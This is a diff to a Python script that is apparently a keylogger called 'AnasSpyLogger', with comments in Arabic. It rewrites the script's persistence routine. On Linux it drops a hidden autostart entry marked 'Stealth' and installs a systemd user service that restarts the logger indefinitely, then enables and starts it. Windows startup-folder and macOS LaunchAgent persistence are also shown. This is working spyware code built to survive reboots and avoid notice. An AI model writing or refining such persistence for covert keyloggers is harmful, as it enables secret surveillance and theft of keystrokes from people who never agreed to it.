@@ -138,29 +138,46 @@ def start_logger():
         listener.join()
 
 # ===== حفظ البرنامج في الخلفية =====
+
 def persist_script():
     system = platform.system()
 
     if system == "Linux":
-        print("[*] System: Linux - Setting up Launch Agent...")
-        autostart_path = os.path.expanduser("~/.config/autostart")
-        if not os.path.exists(autostart_path):
-            os.makedirs(autostart_path)
+        print("[*] System: Linux - Setting up systemd service...")
+        user_service_path = os.path.expanduser("~/.config/systemd/user")
+        os.makedirs(user_service_path, exist_ok=True)
 
-        desktop_file_path = os.path.join(autostart_path, "ASL.desktop")
+        service_file_path = os.path.join(user_service_path, "anaspylogger.service")
 
-        with open(desktop_file_path, 'w') as f:
-            f.write("[Desktop Entry]\n")
-            f.write("Type=Application\n")
-            f.write(f"Exec=sh -c "sleep 15 && python3 {os.path.abspath(__file__)}\n")
-            f.write("Name=ASL\n")
-            f.write("Hidden=true\n")
-            f.write("NoDisplay=true\n")
-            f.write("X-GNOME-Autostart-enabled=true\n")
-            f.write("Comment=Stealth AnasSpyLogger for Anas\n")
+        service_content = f"""[Unit]
+Description=AnasSpyLogger Persistence Service
+
+[Service]
+ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
+Restart=always
+RestartSec=15
+
+[Install]
+WantedBy=default.target
+"""
+
+        # إنشاء ملف الخدمة
+        with open(service_file_path, 'w') as f:
+            f.write(service_content)
+
+        print(f"[+] Service created: {service_file_path}")
+
+        # إعادة تحميل الخدمات الخاصة بالمستخدم
+        subprocess.run(["systemctl", "--user", "daemon-reload"])
+
+        # تفعيل وتشغيل الخدمة
+        subprocess.run(["systemctl", "--user", "enable", "anaspylogger.service"])
+        subprocess.run(["systemctl", "--user", "start", "anaspylogger.service"])
+
+        print("[+] Service enabled and started.")
 
     elif system == "Windows":
-        print("[*] System: Windows - Setting up Launch Agent...")
+        print("[*] System: Windows - Setting up Startup script...")
         startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
         target_path = os.path.join(startup_folder, "AnasSpyLogger.bat")
         with open(target_path, 'w') as f:
@@ -169,8 +186,7 @@ def persist_script():
     elif system == "Darwin":
         print("[*] System: macOS - Setting up Launch Agent...")
         launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
-        if not os.path.exists(launch_agents_path):
-            os.makedirs(launch_agents_path)
+        os.makedirs(launch_agents_path, exist_ok=True)
 
         plist_file_path = os.path.join(launch_agents_path, "com.anasspylogger.plist")
 
